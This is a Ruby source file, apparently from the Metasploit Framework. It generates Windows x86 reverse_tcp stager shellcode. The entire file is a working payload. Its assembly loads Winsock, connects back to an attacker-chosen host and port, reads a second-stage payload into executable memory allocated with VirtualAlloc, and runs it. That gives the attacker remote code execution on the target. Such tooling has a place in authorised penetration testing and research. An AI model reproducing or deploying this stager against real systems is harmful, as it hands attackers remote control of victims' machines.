# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/windows/block_api'
require 'msf/core/payload/windows/exitfunk'

module Msf

###
#
# Complex reverse_tcp payload generation for Windows ARCH_X86
#
###

module Payload::Windows::ReverseTcp

  include Msf::Payload::Windows
  include Msf::Payload::Windows::BlockApi
  include Msf::Payload::Windows::Exitfunk

  #
  # Register reverse_tcp specific options
  #
  def initialize(*args)
    super
  end

  #
  # Generate the first stage
  #
  def generate
    # Generate the simple version of this stager if we don't have enough space
    if self.available_space.nil? || required_space > self.available_space
      return generate_reverse_tcp(
        port: datastore['LPORT'],
        host: datastore['LHOST'],
        retry_count: datastore['ReverseConnectRetries'],
      )
    end

    conf = {
      host: datastore['LHOST'],
      port: datastore['LPORT'],
      retry_count: datastore['ReverseConnectRetries'],
      exitfunk: datastore['EXITFUNC'],
      reliable: true
    }

    generate_reverse_tcp(conf)
  end

  #
  # Generate and compile the stager
  #
  def generate_reverse_tcp(opts={})
    combined_asm = %Q^
      cld                    ; Clear the direction flag.
      call start             ; Call start, this pushes the address of 'api_call' onto the stack.
      #{asm_block_api}
      start:
        pop ebp
      #{asm_reverse_tcp(opts)}
    ^
    Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
  end

  #
  # Determine the maximum amount of space required for the features requested
  #
  def required_space
    # Start with our cached default generated size
    space = cached_size

    # EXITFUNK processing adds 31 bytes at most (for ExitThread, only ~16 for others)
    space += 31

    # Reliability adds 10 bytes for recv error checks
    space += 10

    # The final estimated size
    space
  end

  #
  # Generate an assembly stub with the configured feature set and options.
  #
  # @option opts [Fixnum] :port The port to connect to
  # @option opts [String] :exitfunk The exit method to use if there is an error, one of process, thread, or seh
  # @option opts [Bool] :reliable Whether or not to enable error handling code
  #
  def asm_reverse_tcp(opts={})

    retry_count  = [opts[:retry_count].to_i, 1].max
    reliable     = opts[:reliable]
    encoded_port = "0x%.8x" % [opts[:port].to_i,2].pack("vn").unpack("N").first
    encoded_host = "0x%.8x" % Rex::Socket.addr_aton(opts[:host]||"127.127.127.127").unpack("V").first

    asm = %Q^
      ; Input: EBP must be the address of 'api_call'.
      ; Output: EDI will be the socket for the connection to the server
      ; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)

      reverse_tcp:
        push 0x00003233        ; Push the bytes 'ws2_32',0,0 onto the stack.
        push 0x5F327377        ; ...
        push esp               ; Push a pointer to the "ws2_32" string on the stack.
        push 0x0726774C        ; hash( "kernel32.dll", "LoadLibraryA" )
        call ebp               ; LoadLibraryA( "ws2_32" )

        mov eax, 0x0190        ; EAX = sizeof( struct WSAData )
        sub esp, eax           ; alloc some space for the WSAData structure
        push esp               ; push a pointer to this stuct
        push eax               ; push the wVersionRequested parameter
        push 0x006B8029        ; hash( "ws2_32.dll", "WSAStartup" )
        call ebp               ; WSAStartup( 0x0190, &WSAData );

      create_socket:
        push eax               ; if we succeed, eax will be zero, push zero for the flags param.
        push eax               ; push null for reserved parameter
        push eax               ; we do not specify a WSAPROTOCOL_INFO structure
        push eax               ; we do not specify a protocol
        inc eax                ;
        push eax               ; push SOCK_STREAM
        inc eax                ;
        push eax               ; push AF_INET
        push 0xE0DF0FEA        ; hash( "ws2_32.dll", "WSASocketA" )
        call ebp               ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
        xchg edi, eax          ; save the socket for later, don't care about the value of eax after this

      set_address:
        push #{retry_count}    ; retry counter
        push #{encoded_host}   ; host in little-endian format
        push #{encoded_port}   ; family AF_INET and port number
        mov esi, esp           ; save pointer to sockaddr struct

      try_connect:
        push 16                ; length of the sockaddr struct
        push esi               ; pointer to the sockaddr struct
        push edi               ; the socket
        push 0x6174A599        ; hash( "ws2_32.dll", "connect" )
        call ebp               ; connect( s, &sockaddr, 16 );

        test eax,eax           ; non-zero means a failure
        jz connected

      handle_failure:
        dec dword [esi+8]
        jnz try_connect
      ^

      if opts[:exitfunk]
        asm << %Q^
          failure:
            call exitfunk
          ^
      else
        asm << %Q^
          failure:
            push 0x56A2B5F0        ; hardcoded to exitprocess for size
            call ebp
          ^
      end
      # TODO: Rewind the stack, free memory, try again
=begin
      if opts[:reliable]
        asm << %Q^
           reconnect:

          ^
      end
=end

      asm << %Q^
      connected:

      recv:
        ; Receive the size of the incoming second stage...
        push 0                 ; flags
        push 4                 ; length = sizeof( DWORD );
        push esi               ; the 4 byte buffer on the stack to hold the second stage length
        push edi               ; the saved socket
        push 0x5FC8D902        ; hash( "ws2_32.dll", "recv" )
        call ebp               ; recv( s, &dwLength, 4, 0 );
      ^

      # Check for a failed recv() call
      # TODO: Try again by jmping to reconnect
      if reliable
        asm << %Q^
            cmp eax, 0
            jle failure
          ^
      end

      asm << %Q^
        ; Alloc a RWX buffer for the second stage
        mov esi, [esi]         ; dereference the pointer to the second stage length
        push 0x40              ; PAGE_EXECUTE_READWRITE
        push 0x1000            ; MEM_COMMIT
        push esi               ; push the newly recieved second stage length.
        push 0                 ; NULL as we dont care where the allocation is.
        push 0xE553A458        ; hash( "kernel32.dll", "VirtualAlloc" )
        call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
        ; Receive the second stage and execute it...
        xchg ebx, eax          ; ebx = our new memory address for the new stage
        push ebx               ; push the address of the new stage so we can return into it

      read_more:               ;
        push 0                 ; flags
        push esi               ; length
        push ebx               ; the current address into our second stage's RWX buffer
        push edi               ; the saved socket
        push 0x5FC8D902        ; hash( "ws2_32.dll", "recv" )
        call ebp               ; recv( s, buffer, length, 0 );
    ^

    # Check for a failed recv() call
    # TODO: Try again by jmping to reconnect
    if reliable
      asm << %Q^
          cmp eax, 0
          jle failure
        ^
    end

    asm << %Q^
      add ebx, eax           ; buffer += bytes_received
      sub esi, eax           ; length -= bytes_received, will set flags
      jnz read_more          ; continue if we have more to read
      ret                    ; return into the second stage
      ^

    if opts[:exitfunk]
      asm << asm_exitfunk(opts)
    end

    asm
  end

end

end
